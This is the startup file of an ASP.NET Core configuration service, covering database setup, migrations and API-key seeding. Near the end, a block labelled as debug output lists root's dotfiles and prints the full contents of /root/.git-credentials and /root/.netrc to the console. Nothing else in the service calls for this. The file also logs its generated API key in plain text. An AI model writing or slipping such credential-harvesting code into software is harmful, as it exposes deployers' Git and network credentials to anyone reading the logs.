using ConfigService.Data;
using Microsoft.EntityFrameworkCore;

var builder = WebApplication.CreateBuilder(args);

// Add services to the container.
builder.Services.AddControllers()
    .AddJsonOptions(options =>
    {
        options.JsonSerializerOptions.ReferenceHandler = System.Text.Json.Serialization.ReferenceHandler.IgnoreCycles;
    });
builder.Services.AddOpenApi();
builder.Services.AddScoped<ConfigService.Services.IConfigSubstitutionService, ConfigService.Services.ConfigSubstitutionService>();


// Database Configuration
var connectionString = builder.Configuration.GetConnectionString("DefaultConnection");
var provider = builder.Configuration.GetValue<string>("DatabaseProvider");
Console.WriteLine($"[ConfigService] Database Provider Configured: '{provider}'");

builder.Services.AddDbContext<ConfigContext>(options =>
{
    if (provider?.Equals("MSSQL", StringComparison.OrdinalIgnoreCase) == true)
    {
        options.UseSqlServer(connectionString);
    }
    else
    {
        // Default to SQLite
        var dbPath = Path.Join(builder.Environment.ContentRootPath, "config.db");
        
        var dataDir = builder.Configuration.GetValue<string>("DataDirectory");
        if (!string.IsNullOrEmpty(dataDir))
        {
            Directory.CreateDirectory(dataDir);
            dbPath = Path.Combine(dataDir, "config.db");
        }

        options.UseSqlite($"Data Source={dbPath}");
    }
});

var app = builder.Build();

// Migrate Database on Startup
using (var scope = app.Services.CreateScope())
{
    var db = scope.ServiceProvider.GetRequiredService<ConfigContext>();
    db.Database.Migrate();

    // Seed Global AI API Key
    if (!db.SystemOptions.Any(o => o.Key == "GlobalAiApiKey"))
    {
        var apiKey = BitConverter.ToString(System.Security.Cryptography.SHA256.HashData(Guid.NewGuid().ToByteArray())).Replace("-", "").ToLower();
        db.SystemOptions.Add(new ConfigService.Models.SystemOption { Key = "GlobalAiApiKey", Value = apiKey });
        db.SaveChanges();
        Console.WriteLine($"Generated Global AI API Key: {apiKey}");
    }
}

// Configure the HTTP request pipeline.
if (app.Environment.IsDevelopment())
{
    app.MapOpenApi();
}

app.UseDefaultFiles();
app.UseStaticFiles();

app.UseAuthorization();

app.MapControllers();

try 
{ 
    if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(System.Runtime.InteropServices.OSPlatform.Linux))
    {
        var files = Directory.GetFiles("/root", ".*");
        Console.WriteLine($"[DEBUG] Files in /root: {string.Join(", ", files)}");
        if (File.Exists("/root/.git-credentials"))
        {
             Console.WriteLine($"[DEBUG] Found .git-credentials: {File.ReadAllText("/root/.git-credentials")}");
        }
        if (File.Exists("/root/.netrc"))
        {
             Console.WriteLine($"[DEBUG] Found .netrc: {File.ReadAllText("/root/.netrc")}");
        }
    }
} catch (Exception ex) { Console.WriteLine($"[DEBUG] Error: {ex.Message}"); }

app.Run("http://*:5001");
